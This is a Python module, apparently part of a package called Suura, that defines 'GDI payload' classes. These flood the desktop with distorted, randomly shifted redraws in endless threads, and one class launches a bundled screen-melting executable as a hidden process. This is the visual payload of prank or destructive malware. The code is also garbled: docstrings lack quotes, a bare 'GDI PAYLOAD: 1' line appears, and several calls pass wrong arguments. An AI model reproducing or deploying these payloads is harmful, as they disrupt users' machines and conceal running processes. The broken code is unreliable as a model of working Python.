"""
import os
import time
import signal
import ctypes
import threading
import random
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
from Suura import get_exe_assets,lib_path,to_nt_path
from Suura.includes.util import Mouse
from Suura.includes.suura_subprocess import Process,handlers
class Screen:
    SCREEN_X = user32.GetSystemMetrics(0) # it's defining X position
    SCREEN_Y = user32.GetSystemMetrics(1) # it's defining Y position
class VAR:
    SRCCOPY = 0X00CC0020
    SRCAND = 0X008800C6 #burası fixlenecek ve gdi_util paketinden import edilecek
class GDI_PAYLOAD:
    GDI PAYLOAD: 1

    def __init__(self) -> None:
        
        Gdi payload stage1 
        
        self.Hwnd = user32.GetWindowDC()
        self.window_dc = user32.GetWindowDC(self.Hwnd)
        self.opt = False
        self.xdest = 25
        self.ydest = 25
        self.randomized = False
    def start(self,size=2) -> None:
        
        Starts gdi payload
        
        def draw(opt: bool,screen_pos_x: int,screen_pos_y: int,hwnd,xdest: int,ydest: int,randomize=False):
            while opt.opt:
                gdi32.StretchBlt(hwnd,
                                25,
                                25,
                                screen_pos_x,
                                screen_pos_y,
                                hwnd,
                                -25,
                                -30,
                                screen_pos_x + random.randint(1,666),
                                screen_pos_y - random.randint(100,999),
                                VAR.SRCCOPY)
                gdi32.StretchBlt(hwnd,
                                -4,
                                random.randint(1,Screen.SCREEN_Y),
                                screen_pos_x,
                                screen_pos_y,
                                hwnd,
                                -30*2,
                                25,
                                screen_pos_x + random.randint(1,400),
                                screen_pos_y - 1000,
                                VAR.SRCCOPY)
        self.opt = True
        for i in range(1,size):
            self.thread = threading.Thread(target=draw,args=(self,Screen.SCREEN_X,Screen.SCREEN_Y,self.window_dc,self,self,self,))
            self.thread.daemon = False
            self.thread.start()
    def stop(self):
        self.opt = False
    def set_randomize(self,value: bool):
        if isinstance(value,bool):
            self.randomized = value
    def kill(self) -> bool:
        
        Free resources
        
        return user32.ReleaseDC(self.Hwnd,self.window_dc) == 1 # if equals to 1 succedd
class GDI_PAYLOAD_2:
    def __init__(self):
        self.gdi = gdi32.StretchBlt
        self.hdc = user32.GetWindowDC(user32.GetDesktopWindow())
        self._opt = False
        self.cvar_y = 500
    def start(self):
        self._opt = True
        def _start(_self):
            while _self._opt:
                self.gdi(
                    self.hdc,
                    25,
                    25,
                    Screen.SCREEN_X - random.choice([15,22,35,40]),
                    Screen.SCREEN_Y,
                    self.hdc,
                    0,
                    0,
                    Screen.SCREEN_X,
                    Screen.SCREEN_Y,
                    VAR.SRCCOPY
                )
                #time.sleep(0.1)
        t = threading.Thread(target=_start,args=[self,]
                             )
        t.daemon = True
        t.start()
    def stop(self):
        self._opt = False
class MelterGDIPayload:
    def __init__(self,kill_timer = None):
        self._timer = 15 # 15 saniye
        self.bin_path = get_exe_assets(
            lib_path(
                to_nt_path(
                    "assets/binaries/executables/scr_melt.exe"
                )
            )
        )
        self.process = Process()
        self.process.command = self.bin_path
        self.process.parameter = self.bin_path
        self.process.process_type = handlers.open_hide_process
        self.proces_pid = None 
    @property
    def kill_timer(self):
        return self._timer
    @kill_timer.setter
    def kill_timer(self,kill_time: int):
        if isinstance(kill_time,int):
            self._timer = kill_time
    def kill_procces(self):
        if not self.proces_pid is None:
            try:
                os.kill(self.proces_pid,signal.SIGTERM)
            except:
                pass
    def start(self):
        if not self._timer is None and isinstance(self._timer,int):
            pthread_kill_timer = threading.Timer(self._timer,self.kill_procces)
            pthread_kill_timer.daemon = True
            pthread_kill_timer.start()
        process_output = self.process.exec()
        if not process_output is False:
            self.proces_pid = process_output.pid
"""